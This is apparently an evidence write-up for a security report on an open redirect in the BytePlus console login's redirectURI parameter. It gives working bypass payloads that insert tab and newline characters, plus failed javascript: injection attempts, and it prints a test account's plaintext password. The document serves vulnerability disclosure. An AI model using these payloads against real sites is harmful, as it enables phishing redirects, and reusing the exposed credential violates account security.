# Evidence — Open redirect via auth `redirectURI`

All times UTC, 2026-10-29. Disposable test accounts: A (`test-user-123`,
account 3000823185) and B (`testt456`, account 3001021825).

## A. Already-authenticated victim (one click, no login prompt)

1. Browser page 2 was logged in as account B and sat on
   `https://console.byteplus.com/home`.
2. Navigated to:
   `https://console.byteplus.com/auth/login/?redirectURI=%2F%09%2Fevil.com%2F`
3. After ~4s the top-level document was:
   `{"url":"https://evil.com/","title":"Evil.Com - We get it...Daily."}`

No credentials were re-entered. The login page auto-redirected the
authenticated session to the attacker-controlled external origin.

## B. Victim logs in (login flow)

1. Fresh isolated browser context opened:
   `https://console.byteplus.com/auth/login/?redirectURI=%2F%09%2Fexample.com%2F`
2. Logged in with disposable test account B
   (`testt456` / `Acd3423@#345`).
3. One second after submit the top-level document was:
   `{"t":1,"url":"https://example.com/"}`
4. Preserved network log on that page:
   - `POST https://console.byteplus.com/api/passport/login/mixtureLogin?...` [200]
   - request `referer` header:
     `https://console.byteplus.com/auth/login/?redirectURI=%2F%09%2Fexample.com%2F`
   - request body: `{"Identity":"testt456","Password":"...","EventName":"AuthAccountWithPassword"}`
   - followed by `GET https://example.com/` [200]
5. Login API response body (including `Result.RedirectPath`) was no longer
   buffered by CDP, but the runtime navigation and the preserved
   `GET https://example.com/` document request prove the redirect target.

## C. Why the payload bypasses the whitelist

`redirectURI=%2F%09%2Fexample.com%2F` decodes to `/\t/example.com/`.
- Literal absolute URLs (`https://example.com/`) and `//example.com/` and
  `/\example.com/` were rejected (landed on `/home`).
- The tab character survives server-side validation because the value still
  starts with a single `/`.
- The browser strips the raw tab when resolving the URL:
  `new URL('/\t/example.com/', 'https://console.byteplus.com').href`
  == `https://example.com/` (verified in-page, char codes 47,9,47,...).
- Therefore `location.assign()`/navigation resolves the "relative" path to an
  external origin.

## D. Second control character (`%0a`) also bypasses

1. Logged-in account A (account 3000823185) navigated to:
   `https://console.byteplus.com/auth/login/?redirectURI=/%0a/example.com`
2. The login document immediately resolved to `https://example.com/`
   (`{"href":"https://example.com/","title":"Example Domain"}`).
3. This matches the archive hint's "most working" control characters
   (`%09`, `%0a`, `%0d%0a`, ...). The tab (`%09`) payload is used in the
   report as the canonical PoC.

## Negative escalation checks (`javascript:` not achievable)

- `redirectURI=javascript%3Awindow.__redirjs%3D1` did **not** execute
  JavaScript; the browser landed on a `chrome-error://chromewebdata/`
  403 page (body: "Access to console.byteplus.com was denied ... HTTP ERROR
  403").
- Obfuscated scheme `redirectURI=java%09script%3Adocument.title%3D%27PWNED%27`
  also produced the same 403 page; `window.__redirjs` stayed unset and
  `document.title` was never `PWNED`.
- Conclusion: the parameter is validated as a relative path (must start with
  `/`); control characters get stripped by URL parsing, yielding an external
  `https://` origin, but a `javascript:` scheme cannot be produced.
  Therefore `javascript:` execution is **not** confirmed and the finding is
  excluded from `confirmed-vuln.txt` per AGENT.md Section 9.
